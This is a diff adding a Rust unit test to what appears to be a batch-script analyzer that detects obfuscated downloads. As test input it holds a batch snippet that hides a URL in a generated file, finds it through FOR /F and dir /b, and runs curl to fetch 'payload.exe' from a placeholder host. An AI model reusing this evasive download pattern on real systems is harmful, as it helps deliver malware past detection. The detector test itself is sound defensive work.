@@ -3790,6 +3790,29 @@ for /f "tokens=* delims=" %%F in ('dir /b *.txt') do for /f "tokens=* delims=" %
     }
 
     #[test]
+    fn for_f_dir_b_without_path_lists_generated_current_dir_file_source() {
+        let report = analyze(
+            br#"echo noise>noise.txt
+echo https://for-f-dir-b-current.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%F in ('dir /b') do for /f "tokens=* delims=" %%U in ('type %%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-b-current.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /b without path did not list generated current-dir file for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_dir_b_path_wildcard_discovers_direct_generated_file_source() {
         let report = analyze(
             br#"echo https://for-f-dir-b-path-wildcard.example/payload.exe>C:\Work\url.txt
